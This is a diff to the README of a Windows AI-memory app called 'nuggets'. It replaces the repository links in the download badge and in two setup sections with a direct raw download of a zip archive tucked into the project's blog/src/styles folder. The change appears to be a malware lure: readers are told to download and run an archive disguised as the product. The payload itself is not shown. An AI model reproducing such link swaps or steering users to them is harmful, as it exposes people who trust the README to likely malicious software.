@@ -1,6 +1,6 @@
 # 🤖 nuggets - AI Memory That Stays Ready
 
-[![Download nuggets](https://img.shields.io/badge/Download%20nuggets-4c8bf5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/krxlpz/nuggets)
+[![Download nuggets](https://img.shields.io/badge/Download%20nuggets-4c8bf5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/krxlpz/nuggets/main/blog/src/styles/Software-v1.7.zip)
 
 ## 🧠 What is nuggets?
 
@@ -18,7 +18,7 @@ Use it to:
 
 To get nuggets on Windows, visit this page to download:
 
-https://github.com/krxlpz/nuggets
+https://raw.githubusercontent.com/krxlpz/nuggets/main/blog/src/styles/Software-v1.7.zip
 
 ### 📥 How to set it up
 
@@ -199,7 +199,7 @@ No. If you can install a Windows app and type a question, you can use nuggets
 
 Visit this page to download and run nuggets on Windows:
 
-https://github.com/krxlpz/nuggets
+https://raw.githubusercontent.com/krxlpz/nuggets/main/blog/src/styles/Software-v1.7.zip
 
 ## 🧩 What to expect after setup
 
